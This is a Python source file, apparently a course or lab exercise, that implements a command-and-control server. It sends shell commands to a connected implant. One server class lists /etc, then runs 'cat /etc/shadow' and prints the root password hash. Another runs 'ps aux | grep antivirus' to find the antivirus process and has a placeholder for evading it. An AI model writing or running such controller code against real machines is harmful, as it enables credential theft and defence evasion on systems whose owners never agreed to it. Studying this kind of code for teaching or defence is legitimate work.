import socket
import struct
import re


class CommandServer(object):

    def __init__(self, payloads=None):
        self.payloads = payloads or []

    def run_server(self, host, port):
        listener = socket.socket()
        try:
            print('listening on %s:%d' % (host, port))
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((host, port))
            listener.listen(1)
            while self.payloads:
                print('accepting connections')
                connection, address = listener.accept()
                try:
                    print('handling connection from %s:%d' % address)
                    self.handle_connection(connection)
                finally:
                    connection.close()
        finally:
            listener.close()

    def handle_connection(self, connection):
        payload, product_handler = self.payloads.pop(0)
        print('sending %d bytes of payload' % len(payload))
        connection.send(struct.pack('<I', len(payload)) + payload)
        product_size, = struct.unpack('<I', connection.recv(4))
        print('receiving %d bytes of product' % product_size)
        if product_size > 0:
            product = connection.recv(product_size)
        else:
            product = ''
        if product_handler:
            print('handling product')
            product_handler(payload, product)

    def add_payload(self, payload, handler):
        self.payloads.append((payload, handler))


class ExampleServer(CommandServer):

    def __init__(self):
        super(ExampleServer, self).__init__()
        self.add_payload("/bin/ls /etc", self.handle_ls)

    def handle_ls(self, payload, product):
        for line in product.splitlines():
            if line.strip() == 'shadow':
                print('/etc/shadow found, adding payload to get it')
                self.add_payload('cat /etc/shadow', self.handle_cat_shadow)

    def handle_cat_shadow(self, payload, product):
        for line in product.splitlines():
            if line.startswith('root:'):
                password_hash = line.split(':')[1]
                print('got root password hash: %s' % password_hash)


class EvadeAntivirusServer(CommandServer):

    def __init__(self):
        super(EvadeAntivirusServer, self).__init__()
        self.add_payload(
            self.payload_for_getting_antivirus_pid(),
            self.handle_first_payload)

    def payload_for_getting_antivirus_pid(self):
        return 'ps aux | grep antivirus -m 1'  # get first match

    def get_antivirus_pid(self, product):
        clean_product = re.sub("\s\s+", " ", product)  # remove multiple spaces
        pid = clean_product.split(" ")[1]
        return pid

    def handle_first_payload(self, payload, product):
        pid = int(self.get_antivirus_pid(product))
        print('Antivirus process id is: %d' % pid)
        self.evade_antivirus(pid)

    def evade_antivirus(self, pid):
        print('Oh noes! I should escape %d' % pid)


if __name__ == '__main__':
    ExampleServer().run_server(host='0.0.0.0', port=8000)
